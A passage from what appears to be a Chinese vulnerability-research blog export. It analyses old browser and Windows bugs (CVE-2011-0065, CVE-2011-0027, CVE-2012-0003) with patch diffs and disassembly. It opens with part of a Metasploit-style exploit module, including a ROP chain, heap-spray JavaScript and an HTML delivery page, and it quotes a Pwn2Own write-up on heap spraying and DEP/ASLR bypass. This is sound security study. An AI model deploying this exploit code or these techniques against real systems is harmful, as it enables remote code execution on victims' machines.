&lt;&lt; [0x6D325BFC].pack(&quot;V*&quot;)        # https://www.corelan.be/index.php/2011/07/03/universal-depaslr-bypass-with-msvcr71-dll-and-mona-py/ &lt;MSVCR71.dll&gt;        rop_gadgets = [          0x7c346c0a,  # POP EAX / RETN          0x7c37a140,  # Make EAX readable          0x7c37591f,  # PUSH ESP / ... / POP ECX / POP EBP / RETN          junk,        # EBP (filler)          0x7c346c0a,  # POP EAX / RETN          0x7c37a140,  # *&amp;VirtualProtect()          0x7c3530ea,  # MOV EAX,[EAX] / RETN          0x7c346c0b,  # Slide, so next gadget would write to correct stack location          0x7c376069,  # MOV [ECX+1C],EAX / POP EDI / POP ESI / POP EBX / RETN          junk,        # EDI (filler)          junk,        # will be patched at runtime (VP), then picked up into ESI          junk,        # EBX (filler)          0x7c376402,  # POP EBP / RETN          0x7c345c30,  # ptr to &#x27;push esp /  ret&#x27;          0x7c346c0a,  # POP EAX / RETN          0xfffffdff,  # size 0x00000201 -&gt; ebx          0x7c351e05,  # NEG EAX / RETN          0x7c354901,  # POP EBX / RETN          0xffffffff,  # pop value into ebx          0x7c345255,  # INC EBX / FPATAN / RETN          0x7c352174,  # ADD EBX,EAX / XOR EAX,EAX / INC EAX / RETN          0x7c34d201,  # POP ECX / RETN          0x7c38b001,  # RW pointer (lpOldProtect) (-&gt; ecx)          0x7c34b8d7,  # POP EDI / RETN          0x7c34b8d8,  # ROP NOP (-&gt; edi)          0x7c344f87,  # POP EDX / RETN          0xffffffc0,  # value to negate, target value : 0x00000040, target: edx          0x7c351eb1,  # NEG EDX / RETN          0x7c346c0a,  # POP EAX / RETN          0x90909090,  # NOPS (-&gt; eax)          0x7c378c81,  # PUSHAD / ADD AL,0EF / RETN          0x90909090,  # NOPS (-&gt; eax)        ].pack(&quot;V*&quot;)        rop = rop_pivot + rop_gadgets      end      payload_buf  = &#x27;&#x27;      payload_buf &lt;&lt; rop      payload_buf &lt;&lt; p      escaped_payload = Rex::Text.to_unescape(payload_buf)      # setup the fake memory references      fakevtable = Rex::Text.to_unescape([my_target[&#x27;Fakevtable&#x27;]].pack(&#x27;v&#x27;))      fakefunc = Rex::Text.to_unescape([my_target[&#x27;Fakefunc&#x27;]].pack(&#x27;V*&#x27;))      if my_target.name =~ /Windows XP/        # fast loading JS so we dont get the &#x27;unresponsive script&#x27; warning from ff        custom_js = &lt;&lt;-JS        #&#123;js_element_name&#125; = document.getElementById(&quot;d&quot;);        #&#123;js_element_name&#125;.QueryInterface(Components.interfaces.nsIChannelEventSink).onChannelRedirect(null,new Object,0)        #&#123;js_obj_addr_name&#125; = unescape(&quot;\\x00#&#123;fakevtable&#125;&quot;);        var #&#123;js_sc_name&#125; = unescape(&quot;#&#123;escaped_payload&#125;&quot;);        var #&#123;js_ret_addr_name&#125; = unescape(&quot;#&#123;fakefunc&#125;&quot;);        while(#&#123;js_ret_addr_name&#125;.length &lt; 0x80) &#123;#&#123;js_ret_addr_name&#125; += #&#123;js_ret_addr_name&#125;;&#125;        var #&#123;js_chunk_name&#125; = #&#123;js_ret_addr_name&#125;.substring(0,0x18/2);        #&#123;js_chunk_name&#125; += #&#123;js_sc_name&#125;;        #&#123;js_chunk_name&#125; += #&#123;js_ret_addr_name&#125;;        var #&#123;js_final_chunk_name&#125; = #&#123;js_chunk_name&#125;.substring(0,0x10000/2);        while (#&#123;js_final_chunk_name&#125;.length&lt;0x800000) &#123;#&#123;js_final_chunk_name&#125; += #&#123;js_final_chunk_name&#125;;&#125;        var #&#123;js_block_name&#125; = #&#123;js_final_chunk_name&#125;.substring(0,0x80000 - #&#123;js_sc_name&#125;.length - 0x24/2 - 0x4/2 - 0x2/2);        #&#123;js_array_name&#125; = new Array()        for (n=0;n&lt;0x80;n++)&#123;          #&#123;js_array_name&#125;[n] = #&#123;js_block_name&#125; + #&#123;js_sc_name&#125;;        &#125;        JS      elsif my_target.name =~ /Windows 7/        # setup precision heap spray        ppppr = Rex::Text.to_unescape([my_target[&#x27;Ppppr&#x27;]].pack(&#x27;V*&#x27;))        retns = Rex::Text.to_unescape([my_target[&#x27;Retn&#x27;]].pack(&#x27;V*&#x27;))        # fast loading JS so we dont get the &#x27;unresponsive script&#x27; warning from ff        # precision heap spray        custom_js = &lt;&lt;-JS        #&#123;js_element_name&#125; = document.getElementById(&quot;d&quot;);        #&#123;js_element_name&#125;.QueryInterface(Components.interfaces.nsIChannelEventSink).onChannelRedirect(null,new Object,0)        #&#123;js_obj_addr_name&#125; = unescape(&quot;\\x00#&#123;fakevtable&#125;&quot;);        var #&#123;js_sc_name&#125; = unescape(&quot;#&#123;escaped_payload&#125;&quot;);        var #&#123;js_ret_addr_name&#125; = unescape(&quot;#&#123;fakefunc&#125;&quot;);        var #&#123;js_retns&#125; = unescape(&quot;#&#123;retns&#125;&quot;);        #&#123;js_ret_addr_name&#125; += #&#123;js_retns&#125;;        #&#123;js_ret_addr_name&#125; += #&#123;js_retns&#125;;        #&#123;js_ret_addr_name&#125; += #&#123;js_retns&#125;;        #&#123;js_ret_addr_name&#125; += #&#123;js_retns&#125;;        var #&#123;js_ppppr&#125; = unescape(&quot;#&#123;ppppr&#125;&quot;);        #&#123;js_ret_addr_name&#125; += #&#123;js_ppppr&#125;;        var #&#123;js_filler&#125; = unescape(&quot;%u4344%u4142&quot;);        while(#&#123;js_filler&#125;.length &lt; 0x201) &#123;#&#123;js_filler&#125; += #&#123;js_filler&#125;;&#125;        while(#&#123;js_ret_addr_name&#125;.length &lt; 0x80) &#123;#&#123;js_ret_addr_name&#125; += #&#123;js_ret_addr_name&#125;;&#125;        var #&#123;js_chunk_name&#125; = #&#123;js_ret_addr_name&#125;.substring(0,0x18/2);        #&#123;js_chunk_name&#125; += #&#123;js_sc_name&#125;;        #&#123;js_chunk_name&#125; += #&#123;js_filler&#125;;        #&#123;js_chunk_name&#125; += #&#123;js_ret_addr_name&#125;;        var #&#123;js_final_chunk_name&#125; = #&#123;js_chunk_name&#125;.substring(0,0x10000/2);        while (#&#123;js_final_chunk_name&#125;.length&lt;0x800000) &#123;#&#123;js_final_chunk_name&#125; += #&#123;js_final_chunk_name&#125;;&#125;        var #&#123;js_block_name&#125; = #&#123;js_final_chunk_name&#125;.substring(0,0x80000 - #&#123;js_sc_name&#125;.length - 0x24/2 - 0x4/2 - 0x2/2);        #&#123;js_array_name&#125; = new Array()        for (n=0;n&lt;0x80;n++)&#123;          #&#123;js_array_name&#125;[n] = #&#123;js_block_name&#125; + #&#123;js_sc_name&#125;;        &#125;        JS      end    end    html = &lt;&lt;-HTML    &lt;html&gt;    &lt;body&gt;      &lt;object id=&quot;d&quot;&gt;&lt;object&gt;      &lt;applet code=&quot;#&#123;js_applet_name&#125;.class&quot; width=0 height=0&gt;&lt;/applet&gt;      &lt;script type=&quot;text/javascript&quot;&gt;      #&#123;custom_js&#125;      &lt;/script&gt;    &lt;/body&gt;    &lt;/html&gt;    HTML    #Remove the extra tabs    html = html.gsub(/^ &#123;4&#125;/, &#x27;&#x27;)    print_status(&quot;Sending HTML...&quot;)    send_response_html(cli, html, &#123; &#x27;Content-Type&#x27; =&gt; &#x27;text/html&#x27; &#125;)    # Handle the payload    handler(cli)  endend\n\n注意到 exp 创建了一个 Object，并调用了 onChannelRedirect 函数，其第二个参数为 new Object，这将使得 mChannel 变为悬挂指针。exp 随后申请了一块大小相同的内存对象以填充虚表指针。最后 exp 将 shellcode 堆喷射到了 UAF 时调用的虚函数位置，实现了任意代码执行\n漏洞修复--- a/content/base/src/nsObjectLoadingContent.cpp+++ b/content/base/src/nsObjectLoadingContent.cpp@@ -1010,18 +1010,19 @@ nsObjectLoadingContent::GetInterface(con &#125;  // nsIChannelEventSink NS_IMETHODIMP nsObjectLoadingContent::OnChannelRedirect(nsIChannel *aOldChannel,                                           nsIChannel *aNewChannel,                                           PRUint32    aFlags) &#123;-  // If we&#x27;re already busy with a new load, cancel the redirect-  if (aOldChannel != mChannel) &#123;+  // If we&#x27;re already busy with a new load, or have no load at all,+  // cancel the redirect.+  if (!mChannel || aOldChannel != mChannel) &#123;     return NS_BINDING_ABORTED;   &#125;    if (mClassifier) &#123;     mClassifier-&gt;OnRedirect(aOldChannel, aNewChannel);   &#125;    mChannel = aNewChannel;\n\n补丁添加了对 mChannel 对象的判断，若对象已被释放则直接返回，不再引用\nReferenceVulnerable source codeBugzilla - CVE-2011-0065Github - CVE-2011-0065NVD - CVE-2011-0065CVE - CVE-2011-0065漏洞战争\n","categories":["Vulnerability Investigation"]},{"title":"CVE-2011-0027 漏洞研究","url":"/2024/11/01/Vulnerability%20Investigation/CVE-2011-0027-%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/","content":"荷兰黑客 Peter Vreugdenhil 在 Pwn2Own 2010 大赛上利用 Microsoft Data Access Components(MDAC) 的堆溢出漏洞攻破了 Windows 7 上的 IE 8 浏览器得到了高额奖金。Microsoft 于 2011 年 1 月补丁日修复了上述漏洞，并发布了 MS11-002 公告。其中 MDAC 十一套用在 Windows 平台上提供数据库连接的组件，它没有正确验证内部数据结构的内存分配，当 RecordSet 中用于指定缓冲区大小的 CacheSize 属性过大时会整数溢出，造成实际分配的内存空间小于原来指定的内存空间，进而导致堆溢出\n影响范围:\nMicrosoft Windows XP SP2Microsoft Windows XP SP3Microsoft Windows Server 2003 SP2Microsoft Windows Vista SP1Microsoft Windows Vista SP2Microsoft Windows 7\n\n\n漏洞分析调试运行 IE 并打开样本后触发了 Access Violation 异常，程序终止。Crash Point 为 mov 指令，查看写入地址发现是一个堆块，通过堆使用回溯得出该堆块由 MSDART!MpHeapAlloc 函数分配，该函数由 msado15!CRecordGroup::AllocateHRowRange 函数调用。对该函数下断点并污点分析 MSDART!MpHeapAlloc 函数的堆块大小参数，发现其值为 CacheSize * 4 + 4，而运算的结果将会存在 32 位的寄存器中，因此当 CacheSize 较大时堆块大小将整数溢出，并在后续对堆的相关操作中造成溢出\n\n《漏洞战争》在该漏洞的分析中给出了一个针对 IE 漏洞分析的技巧，即通过 site:https://www.geoffchappell.com 进行高级搜索得到 IE 类及其属性、方法的列表，借此可以获取到三个与 RecordSet 有关的函数，辅助调试。\n\n漏洞利用Peter Vreugdenhil 在 Pwn2Own 2010 大赛上将本漏洞与另一个 IE Use After Free 结合利用攻破了 IE8，具体地说是通过本漏洞达到的溢出效果覆盖了字符串的终止符，进而使得溢出堆块后的虚表地址可以被 JS 函数读取，进而获取到了 msado15.dll 的基址，再进而通过 ROP 绕过了 ASLR 和 DEP。详细可见下方其本人发布的 Pwn2Own 2010 Windows7 Internet Explorer 8 exploit\n\nPwn2Own 2010 Windows 7 Internet Explorer 8 exploitI decided to write a quick document about the techniques I used to exploit Internet Explorer 8 on windows 7 with ASLR and DEP enabled.\nThe exploit consists of two parts.\nThe first part figures out where a certain .dll file is loaded in the current process followed by step 2 that uses the information gathered in step 1 to trigger an exploit that uses some ret2lib technique to disable DEP for our shellcode and then redirects the program flow to the shellcode.\nI will not (and am not allowed to) give out the exact vulnerabilities that I used in the exploit, but I might disclose them someday when Microsoft has them patched. Yes, you read that correctly, them, I used 2 exploits to get the final code execution on W7, but that was partly to speed up the exploit.\nAnyways, I’m writing this on the plane to Vancouver without access to the W7 VMs that I tested the exploit on, so I’ll keep it vague. Also, I only had MS Word and MS Paint for the text and the images, so don’t complain about the quality of the final document 😀\nPart 1: Evading ASLRTo get the address of a .dll file from the browsers memory I used a heap overflow to overwrite the \\x00\\x00 bytes at the end of an utf8 string so that I could read the vftable address of the object that I planted next to the string. This is of course the very short version of a research that took a few days to get everything stable, but it’s an accurate description.\nI found a heap overflow in IE8 that gave me control over both the size of the buffer and the amount of data that got written to the buffer, and some control over what data got written.\nI then tried (with success) to set up the IE process heap as displayed on the next image. (Let me remind you that this image was created with ms paint while flying on a plane … )\n---yellow---|----dark-green----|-bright-green-|-bright-red-|-----dark-red-----\n\n\nThe bright yellow area is our buffer that we can overflow.\nThe green area is our string, with the bright green area being the \\x00\\x00 bytes that mark the end of the string.\nThe red area is a C++ Object in memory with the vftable address as the first DWord as the bright red area.\n\nThis was not as easy as it is to write about it, and it took quite some tricks to get the heap layout the way I wanted it and in a way that the browser would survive a controlled buffer overflow and not crash before I was able to use the information we got. Anyways, after a nice struggle with Internet Explorer I got the heap the way I wanted to, and quite reliable as well. I then triggered the overflow so it overwrote the \\x00\\x00 bytes of the string with the data from the buffer. The string does no longer end with \\x00\\x00. If we then read back the string with a JavaScript function, we suddenly have access to the data in the object since it will continue reading until it comes across a \\x00\\x00 sequence. So we got the address of the objects vftable in JavaScript. The vftable address tells us the base address of the .dll the object belongs to since it is located at a fixed offset from the base of the module. This information is something we can use to write a DEP evading exploit. If I had full control over the data that got written into the overflowing buffer, it would have been easy to overwrite the vftable address as well, but since I only had limited control (enough to ensure no \\x00\\x00 in the data), I could not reliable overwrite the vftable address with my data.\nAnyways, part 1 end with the disclosure of the base address of a .dll loaded in our IE8 process.\nPart 2: Evading DEP after an use-after-free vulnerabilityA few months ago I wrote an exploit for IE8 that evaded perm-DEP on Windows XP by using a combination of heap spraying and return-to-lib. Well actually it’s more a combination of heap spraying and fake object calls, but I have no idea if there is a name for that, but I doubt I’m the first to use it so I won’t try to think of a clever way to name it.\nWhen I was playing around with the Internet Explorer heap for an use-after-free vulnerability I found a while back, I noticed that the allocation of big heap chunks is rather predictable. Not the exact location, but the last 2 bytes are always the same. The blocks will eventually (maybe not the first few, but certainly everything above the 100 on XP) be allocated at 0xYYYY0020 Enough to allow us to spray the heap with a specific pattern that gives us a very high probability of knowing the start address of the pattern.\nFor example the following code will generate a heap filled with the same pattern over and over again. The pattern will start at 0xZZZZZY20 where Z can be anything (reasonable) and Y &#x3D; 0&#x2F;4&#x2F;8&#x2F;C since I used a 0x200 size pattern.\nheap = new heapLib.ie(0x20000);var heapspray = unescape(&quot;%u4141%u4242&quot;);while(heapspray.length &lt; 0x200) heapspray += unescape(&quot;%u4444&quot;);var heapblock = heapspray;while(heapblock.length &lt; 0x40000) heapblock += heapblock;finalspray = heapblock.substring(2, 0x40000 - 0x21);for(var i = 0; i &lt; 500; i++) &#123;  heap.alloc(finalspray);&#125;\n\nThis will result in allocations that look a bit like this:\nHeap alloc size(0x7ffc0) allocated at 063d0020Heap alloc size(0x7ffc0) allocated at 06450020Heap alloc size(0x7ffc0) allocated at 064d0020Heap alloc size(0x7ffc0) allocated at 06550020Heap alloc size(0x7ffc0) allocated at 065d0020Heap alloc size(0x7ffc0) allocated at 06650020Heap alloc size(0x7ffc0) allocated at 066d0020\nAs you can see you get a rather contiguous block of filled memory. The best place to find the start of your pattern would be something like: 0x06442020\nThe pattern used in the above sample code in is quite useless of course, but the pattern you want depends in the vulnerability you’re exploiting.\nAs you can see I used heaplib created by Alexander Sotirov as an easy way to allocate the strings.\nThis predictable behavior also works on Windows 7 although I needed to spray a bit more then on Windows XP. For XP I used 500 as a spray size, and then used 0x0a042020 as my start address, for Windows 7 I sprayed 900 times and used 0x16402020 as my start address.\nThe result is a heap where (if sprayed enough) we can predict the memory layout at an address that we choose. For XP I used 0x0a042020 (don’t ask me why … ). If we are not extremely unlucky that address should be the exact starting point of one of our heap patterns.\nI’ll explain next how to ‘reliable’ exploit an use-after-free when it’s an easy one. The ones I usually find are the easy types, and with easy I mean: the freeing of the object happens on a different line of JS Code then the using. So we have plenty of time to refill the objects freed address with data that we like.\nSay we have the following lines of JavaScript that trigger our hypothetical use-after-free situation:\nvar MyObject = new Object(); &lt;Allocates the object&gt;var MyObject = new Object(); &lt;Gets a reference to the object&gt;var MyObjRef = MyObject.SomeProperty;MyObject.CleanUp(); &lt;Frees the object without taking care of „MyObjRef „&gt;alert(MyObjectRef.parent); &lt;Accesses the no longer existing object&gt;\n\nNow we want to fill the space left by our freed object with useful data before we call the lines that access the object again. Most times a use-after-free vulnerability will try to do something with the objects vftable. The vftable address is the first DWord of the objects allocated memory, so we need some type of heap spray that can reliable fill the freed memory with user controlled data at the first DWord.\nThe good thing is that Internet Explorer uses a heap that keeps track of recently freed memory so it can reuse them if a request for an allocation with approx the same size comes in again. If I’m correct it is called the LFHeap (Low Fragmentation I think) but what’s in a name. This means that if we know the size of the freed object and we then allocate our own data with the exact same size, it should fill up the recently freed memory nicely.\nGetting to know the size of the freed object is not that hard, just use breakpoints on heap alloc en heap free calls in ntdll.\nThen we have to allocate the correct memory size again. For this I usually add some ‘className’ properties to an array of div elements I created earlier. The nice thing about that is that the className properties get allocated as strings with any size you wish, and without any heap overhead, so the first DWord of the allocation is user controlled data. The only drawback is the fact that you can’t use \\x00\\0x00 in your data, but I haven’t found that a problem yet.\nSo what we need to do:\n\nCreate some array to hold our div elements ( var DivArray &#x3D; new Array(); )\nFill an array with say 50 objects. (DivArray.push(document.createElement(‘div’); )\nRun the JavaScript code until we free the object.\nAdd some classNames to the divs: ( DivArray*i+.className &#x3D; unescape(“%u4141%u4141……\nRe-use the freed object.\n\nWhat will happen next is most likely something like this:\nmove eax, [ecx]  ecx = our object memory.call [eax+0xYY]  eax now holds 0x41414141\n\nBut how do we turn this into DEP evasion? Simple: We control %eax, we also know the layout of the heap on certain locations. What we do is: set %eax to the start of our heap pattern. Now let’s assume that the virtual function called is located at 0x34. Given the fact that we know where our pattern start and we know where in our pattern we try to read our function call, we completely control where IE will call to. We can unfortunately not call directly into our heap spray. What we can do however is use already existing MS code to call ‘VirtualProtect’ and change the memory protect settings for our shellcode from READWRITE into READWRITEEXECUTE.\nFor example, let’s assume we find a code sequence that looks a bit like this:\n0x6ff02348 : mov ecx, eax             call [eax+10]and another that goes like:0x6FF01234 : push [eax+70]             push [eax+60]             push [eax+50]             push [eax+40]             push [eax+34]             push [eax+20]             call [ecx+14]             …..             …..             retn\n\nif we then set our heap pattern so that\n\nPattern Start + 0x34 (The first call from the freed memory) points to ( 0x6FF02348)\nPattern Start + 0x10 points to the second address location ( 0x6FF01234)\nPattern Start + 0x14 points to VirtualProtect in kernel32 (0x7c801ad4)\nPattern Start + 0x20 points to our Pattern Start\nPattern Start + 0x30 &#x3D; 0x200 (our pattern size)\nPattern Start + 0x40 &#x3D; 0x40 (If I’m correct this is READWRITEEXCUTE)\nPattern Start + 0x50 &#x3D; some address in our heap that we don’t need\n\nAs you can see this will eventually call VirtualProtect and change the memory status into executable. And the funny thing is that we jump in the middle of the function and just push a lot of stuff on the stack. This will screw up the stack, and if the code hit the retn we will again control the eip. This will work great on Windows XP where we know the exact address of VirtualProtect. On Windows 7 we need to be just a little bit more creative.\nHow do we call VirtualProtect without knowing the exact location of that function since kernel32.dll gets randomized as well you might wonder? Well, a lot of .dll files in Internet Explorer contain the ATL library. The ATL library uses the VirtualProtect function somewhere. This means that the exact location of the VirtualProtect function in located in the import section of the .dll of which we know the location. Say we know the .dll is loaded at 0x6fff0000, we then know that (for example) 0x6fff1288 has the correct address of VirtualProtect. All we need now is to set %eax to 0x6fff1280 before ‘call *eax+8+ ‘ for example. This again can be done with creative code reuse and setting our pattern. When I write exploits using this technique I usually set my pattern to contain a steadily climbing range of numbers like:\nvar pattern = unescape(“%u0000%u0001%u0002%u0003%u0004%u0005%u0006……..”)\n\nThis way it is very easy to spot the exact location in your string that you need to edit next.\nBasically all we do is string together some pieces of already existing code while using either call [] or jmp to jump to the next lines of assembly that we need until we are all set up for the call to VirtualProtect. Then we line up for the VirtualProtect call, give it the right parameters, and now our heap spray suddenly has EXECUTE rights. If the call to VirtualProtect pushed more parameters than expected, the return stack will be screwed and we end up where we want.\nI just read most of it back and Agree that it’s a bit of a lousy paper, skipping certain concepts and assuming prior knowledge, continuously switching from ‘I’ to ‘we’, but hey, you read it so far so maybe you liked it anyways 😀\nPeter Vreugdenhil\n\n说实话这个漏洞确实比较难以利用，因为其简单性所以这次的漏洞分析也写的比较简略，因为其\n漏洞修复微软 Patch 一个 ULongLongToULong 函数进行了类型转换并增加了堆块大小检查进而修复了该漏洞\n\n《漏洞战争》在本漏洞的漏洞修复部分写错了，真正修复这个漏洞的关键是 ULongLongToULong 函数，相关勘误参见 Github 上的勘误表仓库，勘误讨论原帖见看雪论坛贴 - [讨论]漏洞战争对cve-2011-0027补丁的分析是否有误？\n\nReferenceNVD - CVE-2011-0027CVE - CVE-2011-0027Microsoft 安全公告 MS11-002 - 严重Github - CVE-2011-0027Exploit Database - CVE-2011-0027漏洞战争Microsoft 安全公告 MS11-002 - 严重\n","categories":["Vulnerability Investigation"]},{"title":"CVE-2012-0003 漏洞研究","url":"/2024/09/19/Vulnerability%20Investigation/CVE-2012-0003-%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/","content":"微软的多媒体库 winmm.dll 中的 midiOutPlayNextPolyEvent 函数在处理 MIDI 文件时对其 Note On 和 Note Off 字段没有做限制,导致可以操纵该字段访问堆块之外的 1 个字节的内存空间,攻击者可利用该堆溢出漏洞在网页中嵌入恶意构造的 MIDI 文件实现 RCE。\n影响范围:\nMicrosoft Windows 7, Windows 7 SP1Microsoft Windows Server 2003 SP2Microsoft Windows Server 2008 SP2, Windows Server 2008 R2Microsoft Windows Vista SP2Microsoft Windows Xp SP2, Windows Xp SP3\n\n\nMIDI 文件格式MIDI(Musical Instrument Digital Interface) 文件格式主要用于音乐软件和硬件设备存储歌曲信息,包括标题、曲目名等。一个 MIDI 文件由若干 Chunk 组成,每个 Chunk 包含了 4 字节的 Chunk Type,4 字节的 Data Length 和 Chunk Data,文件内的 Chunk 主要分为 Chunk Type 为 MThd 的 Header Chunk 和 Chunk Type 为 MTrk 的 Track Chunk 两种。\nHeader Chunk 的 Chunk Data 为 2 字节的 Format Type,2 字节的 Number of Tracks 和 2 字节的 Time DivisionTrack Chunk 的 Chunk Data 则为音轨事件数据,由个数不定大小不定的音轨事件组成。一个音轨事件 MTrk Event 包含了 Delta-time 和 Event,事件类型包括 Note Off, Note On, Note Aftertouch, Controller, Program Change, Pitch Bend 等,不同的事件类型有着不同的格式\n\n更多细节可参阅Standard MIDI-File Format Spec. 1.1, updated\n\nAdvanced Exploitation of Internet Explorer Heap Overflow Vulnerabilities (MS12-004)\n这篇博客被删了,因此文末的 Reference 给出的超链接应该查看不了原文,但漏洞战争的附件中有该博客网页 html 文件,可通过查看漏洞战争的附件阅读这篇博客或在 archive.org 中搜索\n\nIE 的 winmm.dll 和 mshtml.dll,或者具体地说 winmm.dll 的 _DllProcessAttach 和 mshtml.dll 的 _DllMainStartup 库函数使用的堆空间都来自于 GetProcessHeap 函数,因此二者使用同一个堆空间,即进程的默认堆。这意味着 winmm.dll 中存在的 CVE-2012-0003 漏洞可以用在 mshtml.dll 中的代码上。事实上,CVE-2012-0003 漏洞可以实现将一个 JS 对象由 String 类型更改为 Object 类型,这样浏览器就会在读取 String 类型对象时将其当作 Object 类型对象进行处理————而 Object 类型的对象在被处理时会根据虚函数指针进行一次函数调用————进而泄露对象的虚函数表或将字符串内容当作虚函数表指针进行引用,以绕过 ASLR&#x2F;DEP 实现 RCE\n漏洞分析开启 hpa 调试运行浏览器并打开样本,浏览器将在用户允许运行 ActiveX 控件后因 ESI 指向堆外不可读地址触发 Access Violation 异常而崩溃。查看函数调用栈发现崩溃函数位于 WINMM.DLL 中。使用 IDA 打开 winmm.dll 文件时可一键从微软符号表服务器处下载符号表,根据调试时得到的偏移地址 76B2D038 定位到 winmm.dll 文件中的 midiOutPlayNextPolyEvent 函数,其汇编代码如下\n.text:76B2D038.text:76B2D038                               ; =============== S U B R O U T I N E =======================================.text:76B2D038.text:76B2D038                               ; Attributes: bp-based frame.text:76B2D038.text:76B2D038                               ; int __stdcall midiOutPlayNextPolyEvent(WPARAM wParam).text:76B2D038                               _midiOutPlayNextPolyEvent@4 proc near   ; CODE XREF: midiOutTimerTick(x,x,x,x,x)+4A↓p.text:76B2D038.text:76B2D038                               var_14= dword ptr -14h.text:76B2D038                               var_10= dword ptr -10h.text:76B2D038                               hmo= dword ptr -0Ch.text:76B2D038                               var_8= dword ptr -8.text:76B2D038                               var_1= byte ptr -1.text:76B2D038                               wParam= dword ptr  8.text:76B2D038.text:76B2D038 8B FF                         mov     edi, edi.text:76B2D03A 55                            push    ebp.text:76B2D03B 8B EC                         mov     ebp, esp.text:76B2D03D 83 EC 14                      sub     esp, 14h.text:76B2D040 57                            push    edi.text:76B2D041 8B 7D 08                      mov     edi, [ebp+wParam].text:76B2D044 83 7F 34 00                   cmp     dword ptr [edi+34h], 0.text:76B2D048 0F 85 3E 02 00 00             jnz     loc_76B2D28C.text:76B2D048.text:76B2D04E 53                            push    ebx.text:76B2D04F 56                            push    esi.text:76B2D04F.text:76B2D050.text:76B2D050                               loc_76B2D050:                           ; CODE XREF: midiOutPlayNextPolyEvent(x)+33↓j.text:76B2D050                                                                       ; midiOutPlayNextPolyEvent(x)+24C↓j.text:76B2D050 8B 77 3C                      mov     esi, [edi+3Ch].text:76B2D053 85 F6                         test    esi, esi.text:76B2D055 0F 84 2F 02 00 00             jz      loc_76B2D28A.text:76B2D055.text:76B2D05B 57                            push    edi.text:76B2D05C E8 29 FA FF FF                call    _midiOutScheduleNextEvent@4     ; midiOutScheduleNextEvent(x).text:76B2D05C.text:76B2D061 85 C0                         test    eax, eax.text:76B2D063 75 08                         jnz     short loc_76B2D06D.text:76B2D063.text:76B2D065 57                            push    edi                             ; wParam.text:76B2D066 E8 5C FA FF FF                call    _midiOutDequeueAndCallback@4    ; midiOutDequeueAndCallback(x).text:76B2D066.text:76B2D06B EB E3                         jmp     short loc_76B2D050.text:76B2D06B.text:76B2D06D                               ; ---------------------------------------------------------------------------.text:76B2D06D.text:76B2D06D                               loc_76B2D06D:                           ; CODE XREF: midiOutPlayNextPolyEvent(x)+2B↑j.text:76B2D06D 8B 0E                         mov     ecx, [esi].text:76B2D06F 8B 46 24                      mov     eax, [esi+24h].text:76B2D072 8B 04 01                      mov     eax, [ecx+eax].text:76B2D075 8B 57 7C                      mov     edx, [edi+7Ch].text:76B2D078 03 C2                         add     eax, edx.text:76B2D07A 3B 87 80 00 00 00             cmp     eax, [edi+80h].text:76B2D080 89 4D 08                      mov     [ebp+wParam], ecx.text:76B2D083 89 47 74                      mov     [edi+74h], eax.text:76B2D086 0F 8F FE 01 00 00             jg      loc_76B2D28A.text:76B2D086.text:76B2D08C 8B 56 24                      mov     edx, [esi+24h].text:76B2D08F 89 47 7C                      mov     [edi+7Ch], eax.text:76B2D092 83 46 24 04                   add     dword ptr [esi+24h], 4.text:76B2D096 8B 5E 24                      mov     ebx, [esi+24h].text:76B2D099 8B 0C 0B                      mov     ecx, [ebx+ecx].text:76B2D09C 51                            push    ecx.text:76B2D09D 83 C3 04                      add     ebx, 4.text:76B2D0A0 57                            push    edi.text:76B2D0A1 89 55 F0                      mov     [ebp+var_10], edx.text:76B2D0A4 89 4D EC                      mov     [ebp+var_14], ecx.text:76B2D0A7 89 5E 24                      mov     [esi+24h], ebx.text:76B2D0AA E8 48 F7 FF FF                call    _mseIDtoHMidi@8                 ; mseIDtoHMidi(x,x).text:76B2D0AA.text:76B2D0AF 89 45 F4                      mov     [ebp+hmo], eax.text:76B2D0B2 8B 45 08                      mov     eax, [ebp+wParam].text:76B2D0B5 8B 0C 03                      mov     ecx, [ebx+eax].text:76B2D0B8 83 C3 04                      add     ebx, 4.text:76B2D0BB 8B C1                         mov     eax, ecx.text:76B2D0BD 89 5E 24                      mov     [esi+24h], ebx.text:76B2D0C0 C1 E8 18                      shr     eax, 18h.text:76B2D0C3 81 E1 FF FF FF 00             and     ecx, 0FFFFFFh.text:76B2D0C9 33 DB                         xor     ebx, ebx.text:76B2D0CB 39 5D F4                      cmp     [ebp+hmo], ebx.text:76B2D0CE 88 45 0B                      mov     byte ptr [ebp+wParam+3], al.text:76B2D0D1 89 4D F8                      mov     [ebp+var_8], ecx.text:76B2D0D4 74 2A                         jz      short loc_76B2D100.text:76B2D0D4.text:76B2D0D6 A8 40                         test    al, 40h.text:76B2D0D8 74 26                         jz      short loc_76B2D100.text:76B2D0D8.text:76B2D0DA 8B 45 F0                      mov     eax, [ebp+var_10].text:76B2D0DD 53                            push    ebx                             ; dwParam2.text:76B2D0DE 56                            push    esi                             ; dwParam1.text:76B2D0DF 89 46 1C                      mov     [esi+1Ch], eax.text:76B2D0E2 FF 77 4C                      push    dword ptr [edi+4Ch]             ; dwUser.text:76B2D0E5 0F B7 47 4A                   movzx   eax, word ptr [edi+4Ah].text:76B2D0E9 68 CA 03 00 00                push    3CAh                            ; dwMsg.text:76B2D0EE FF 77 04                      push    dword ptr [edi+4]               ; hDevice.text:76B2D0F1 50                            push    eax                             ; dwFlags.text:76B2D0F2 FF 77 44                      push    dword ptr [edi+44h]             ; dwCallback.text:76B2D0F5 E8 9F 83 FE FF                call    _DriverCallback@28              ; DriverCallback(x,x,x,x,x,x,x).text:76B2D0F5.text:76B2D0FA 8A 45 0B                      mov     al, byte ptr [ebp+wParam+3].text:76B2D0FD 8B 4D F8                      mov     ecx, [ebp+var_8].text:76B2D0FD.text:76B2D100.text:76B2D100                               loc_76B2D100:                           ; CODE XREF: midiOutPlayNextPolyEvent(x)+9C↑j.text:76B2D100                                                                       ; midiOutPlayNextPolyEvent(x)+A0↑j.text:76B2D100 24 BF                         and     al, 0BFh.text:76B2D102 0F B6 D0                      movzx   edx, al.text:76B2D105 2B D3                         sub     edx, ebx.text:76B2D107 0F 84 A9 00 00 00             jz      loc_76B2D1B6.text:76B2D107.text:76B2D10D 4A                            dec     edx.text:76B2D10E 0F 84 91 00 00 00             jz      loc_76B2D1A5.text:76B2D10E.text:76B2D114 83 EA 7F                      sub     edx, 7Fh.text:76B2D117 74 16                         jz      short loc_76B2D12F.text:76B2D117.text:76B2D119 84 C0                         test    al, al.text:76B2D11B 0F 89 55 01 00 